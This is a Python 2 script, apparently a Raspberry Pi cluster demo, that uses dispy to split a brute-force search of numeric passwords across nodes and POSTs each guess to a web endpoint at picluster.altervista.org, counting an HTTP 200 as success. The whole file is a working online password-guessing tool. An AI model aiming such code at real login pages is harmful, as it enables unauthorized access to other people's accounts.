import dispy, time, sys

# argv: [password length]

global ip_master
global ip_nodes

ip_master = ""
ip_nodes = [""]

if ip_master == "" or len(ip_nodes) == 0:
    print "First set ip_master and nodes' ip"
    exit()

def crackPassword (startPsw, stopPsw):
    import requests
    for i in xrange(startPsw, stopPsw):
        if requests.post("http://picluster.altervista.org/secure/", data = {"psw":i}).status_code == 200:
            return i
    return None

def run (pswLength, numJobs):
    cluster = dispy.JobCluster(
        crackPassword,
        nodes = ip_nodes,
        ip_addr = ip_master
    )

    unit = int((10**pswLength)/numJobs)+1
    jobs = []

    for i in xrange(numJobs):
        print str(i*unit) + " - " + str((i+1)*unit)
        jobs.append(cluster.submit(i*unit,(i+1)*unit))

    cluster.wait()
    cluster.stats()

    for j in jobs:
        if j.result is not None:
            return j.result

if __name__ == "__main__":

    tStart = time.time()

    crackedPassword = run(int(sys.argv[1]), int(sys.argv[2]))

    tEnd = time.time() - tStart

    print "Computation real time: " + str(tEnd)[:5] + " sec\n"

    print "Cracked password: " + str(crackedPassword)
    print "http://picluster.altervista.org/secure/\n"